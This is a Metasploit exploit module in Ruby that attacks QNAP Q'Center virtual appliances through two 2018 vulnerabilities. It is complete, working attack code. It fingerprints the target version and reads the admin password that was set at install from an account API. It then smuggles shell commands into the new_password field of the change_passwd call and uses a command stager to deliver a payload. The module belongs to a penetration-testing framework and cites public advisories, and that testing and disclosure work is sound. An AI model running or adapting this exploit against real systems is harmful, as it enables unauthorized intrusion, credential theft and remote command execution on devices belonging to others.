##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'            => "QNAP Q'Center change_passwd Command Execution",
      'Description'     => %q{
        This module exploits a command injection vulnerability in the
        `change_passwd` API method within the web interface of QNAP Q'Center
        virtual appliance versions prior to 1.7.1083.

        The vulnerability allows the 'admin' privileged user account to
        execute arbitrary commands as the 'admin' operating system user.

        Valid credentials for the 'admin' user account are required, however,
        this module also exploits a separate password disclosure issue which
        allows any authenticated user to view the password set for the 'admin'
        user during first install.

        This module has been tested successfully on QNAP Q'Center appliance
        version 1.6.1075.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Ivan Huertas', # Discovery and PoC
          'bcoles' # Metasploit
        ],
      'References'      =>
        [
          ['CVE', '2018-0706'], # privesc
          ['CVE', '2018-0707'], # rce
          ['EDB', '45015'],
          ['URL', 'https://www.coresecurity.com/advisories/qnap-qcenter-virtual-appliance-multiple-vulnerabilities'],
          ['URL', 'https://seclists.org/fulldisclosure/2018/Jul/45'],
          ['URL', 'https://www.securityfocus.com/archive/1/542141'],
          ['URL', 'https://www.qnap.com/en-us/security-advisory/nas-201807-10']
        ],
      'Platform'        => 'linux',
      'Arch'            => [ARCH_X86, ARCH_X64],
      'Targets'         => [['Auto', { }]],
      'CmdStagerFlavor' => %w[printf bourne wget],
      'Privileged'      => false,
      'DisclosureDate'  => 'Jul 11 2018',
      'DefaultOptions'  => {'RPORT' => 443, 'SSL' => true},
      'DefaultTarget'   => 0))
    register_options [
      OptString.new('TARGETURI', [true, "Base path to Q'Center", '/qcenter/']),
      OptString.new('USERNAME', [true, 'Username for the application', 'admin']),
      OptString.new('PASSWORD', [true, 'Password for the application', 'admin'])
    ]
    register_advanced_options [
      OptBool.new('ForceExploit',  [false, 'Override check result', false])
    ]
  end

  def check
    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'index.html')

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    unless res.code == 200 && res.body.include?("<title>Q'center</title>")
      vprint_error "Target is not a QNAP Q'Center appliance"
      return CheckCode::Safe
    end

    version = res.body.scan(/\.js\?_v=([\d\.]+)/).flatten.first
    if version.to_s.eql? ''
      vprint_error "Could not determine QNAP Q'Center appliance version"
      return CheckCode::Detected
    end

    version = Gem::Version.new version
    vprint_status "Target is QNAP Q'Center appliance version #{version}"

    if version >= Gem::Version.new('1.7.1083')
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def login(user, pass)
    vars_post = {
      name:     user,
      password: Rex::Text.encode_base64(pass),
      remember: 'false'
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, '/hawkeye/v1/login'),
      'ctype'  => 'application/json',
      'data'   => vars_post.to_json
    })

    if res.nil?
      fail_with Failure::Unreachable, 'Connection failed'
    elsif res.code == 200 && res.body.eql?('{}')
      print_good "Authenticated as user '#{user}' successfully"
    elsif res.code == 401 || res.body.include?('AuthException')
      fail_with Failure::NoAccess, "Invalid credentials for user '#{user}'"
    else
      fail_with Failure::UnexpectedReply, "Unexpected reply [#{res.code}]"
    end

    @cookie = res.get_cookies
    if @cookie.nil?
      fail_with Failure::UnexpectedReply, 'Failed to retrieve cookie'
    end
  end

  #
  # Retrieve list of user accounts
  #
  def account
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, '/hawkeye/v1/account'),
      'cookie' => @cookie
    })
    JSON.parse(res.body)['account']
  rescue
    print_error 'Could not retrieve list of users'
    nil
  end

  #
  # Login to the 'admin' privileged user account
  #
  def privesc
    print_status 'Retrieving admin user details ...'

    admin = account.first
    if admin.blank? || admin['_id'].blank? || admin['name'].blank? || admin['new_password'].blank?
      fail_with Failure::UnexpectedReply, 'Failed to retrieve admin user details'
    end

    @id = admin['_id']
    @pw = Rex::Text.decode_base64 admin['new_password']
    print_good "Found admin password used during install: #{@pw}"

    login admin['name'], @pw
  end

  #
  # Change password to +new+ for user with ID +id+
  #
  def change_passwd(id, old, new)
    vars_post = {
      _id: id,
      old_password: Rex::Text.encode_base64(old),
      new_password: Rex::Text.encode_base64(new),
    }
    send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, '/hawkeye/v1/account'),
      'query'  => 'change_passwd',
      'cookie' => @cookie,
      'ctype'  => 'application/json',
      'data'   => vars_post.to_json
    }, 5)
  end

  def execute_command(cmd, _opts)
    change_passwd @id, @pw, "\";#{cmd};\""
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    login datastore['USERNAME'], datastore['PASSWORD']

    if datastore['USERNAME'].eql? 'admin'
      @id = @cookie.scan(/_ID=(.+?);/).flatten.first
      @pw = datastore['PASSWORD']
    else
      privesc
    end

    print_status 'Sending payload ...'
    execute_cmdstager linemax: 10_000
  end
end
